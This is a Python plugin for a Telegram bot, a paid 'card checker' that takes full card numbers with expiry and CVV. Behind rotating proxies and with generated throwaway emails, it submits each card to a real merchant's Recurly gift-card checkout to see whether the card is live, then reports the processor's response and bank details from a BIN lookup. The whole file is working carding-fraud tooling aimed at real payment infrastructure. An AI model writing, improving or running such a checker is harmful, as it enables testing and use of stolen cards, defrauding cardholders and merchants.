import requests as r 
import string, random, re, time
from  datetime import datetime
from src.assets.functions import antispam
from src.assets.connection import Database
from pyrogram.types import Message
from pyrogram import Client, filters, enums
from pyrogram.enums import ParseMode


@Client.on_message(filters.command(["recurly", "re"], ["/", ",", ".", ";", "-"]))
async def jaico(client: Client, m: Message):
    card = m.text.split(" ", 1)[1] if not m.reply_to_message else m.reply_to_message.text
    user_id = m.from_user.id
    with Database() as db:
        if not db.IsPremium(user_id):
            return await m.reply("<b>You are not premium</b>", quote=True)
        user_info = db.GetInfoUser(m.from_user.id)
    if not card:
        return await m.reply("You need to provide a card to verify", quote=True)
    antispam_result = antispam(user_id, user_info["ANTISPAM"])
    if antispam_result != False:
        return await m.reply(
            f"Please wait <code>{antispam_result}'s</code>", quote=True
        )
    await client.send_chat_action(m.chat.id, action=enums.ChatAction.TYPING)
    msg = await m.reply("checking...", quote=True)
    cc_check = await get_live(card, msg)    


def getIndex(response):
    with open("index.html", "w", encoding="utf-8") as f:
        f.write(response.text)

def load_proxies(filename):
    with open(filename, 'r') as file:
        proxies = [{'http': line.strip()} for line in file if line.strip()]
    return proxies
        
def getStr(text:str, a:str, b:str) -> str:
    return text.split(a)[1].split(b)[0]

def email_generator():
    dominio = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'example.com']
    longitud = random.randint(8, 12)
    usuario = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(longitud))
    correo = usuario + '@' + random.choice(dominio)
    return correo

BIN_API = "https://bins.antipublic.cc/bins/"

async def get_live(card, msg):
    card = card.replace(":", "|").replace("/", "|").replace(" ", "|")
    card_details = card.split("|")
    ccn = card_details[0]
    month = card_details[1]
    year = card_details[2]
    cvv = card_details[3]  
    session = r.Session()
    proxies = load_proxies("src/extras/proxies.txt")
    proxy = random.choice(proxies)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    initial_time = time.perf_counter()

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'es-AR,es;q=0.9',
        'cache-control': 'max-age=0',
        'priority': 'u=0, i',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    response = session.get('https://digitaltheatre.recurly.com/purchase/gift_card/1yeargift', headers=headers, proxies=proxy)
    token = getStr(response.text, '"authenticity_token" value="', '" autocomplete="off" />')
    current_time = datetime.now().strftime("%D - %H:%M:%S")
    msgg = f"""<b>{current_time}</b>
━━━━━━━━━━━
<b>CC:</b> {card}
<b>Status:</b> Checking...
"""
    await msg.edit_text(msgg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)



    email = email_generator()

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'es-AR,es;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://digitaltheatre.recurly.com',
        'priority': 'u=0, i',
        'referer': 'https://digitaltheatre.recurly.com/purchase/gift_card/1yeargift',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    data = {
        'authenticity_token': token,
        'gift_card[currency]': 'GBP',
        'gift_card[unit_amount_in_cents]': '9999',
        'gift_card[recipient_first_name]': 'Leonel',
        'gift_card[recipient_last_name]': 'Checker',
        'gift_card[recipient_email]': email,
        'gift_card[personal_message]': 'hola amiko quaker',
        'gift_card[gifter_name]': 'quaker crew',
        'account[first_name]': 'Quacker',
        'account[last_name]': 'Crew',
        'account[email]': email,
        'payment_method': 'card',
        'billing_info[number]': ccn,
        'billing_info[verification_value]': cvv,
        'billing_info[month]': month,
        'billing_info[year]': year,
        'billing_info[zip]': '10080',
}

    response = session.post(
        'https://digitaltheatre.recurly.com/purchase/gift_card/1yeargift',
        headers=headers,
        data=data,
        proxies=proxy
)
    
    #await msg.edit_text("2", parse_mode=ParseMode.MARKDOWN)

    card_response = getStr(response.text, '<div class="Alert-body">', '</div>').replace('\n', ' ').replace("        ", '')
    BIN = card[0:6]
    data = r.get(BIN_API+BIN).json()
    final_time = time.perf_counter() - initial_time
    
    mssg = f"""<b>#Recurly_Auth ($re) 🌩️</b>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccn}:{month}:{year}:{cvv}</code>]
<a href="https://t.me/ByDog3r">↯</a> <b>Status:<b> 
<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> {card_response}
<a href="https://t.me/ByDog3r">↯</a> <b>Gateway: Auth payment</b>
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['brand']}</code> - <code>{data['type']}</code> - <code>{data['level']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['bank']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['country_name']} {data['country_flag']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}""" # to check proxy add <a href="https://t.me/ByDog3r">⊁</a> <b>Proxy</b> :{proxy['http']} ✅

    
    await msg.edit_text(mssg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    session.cookies.clear()
    session.close()
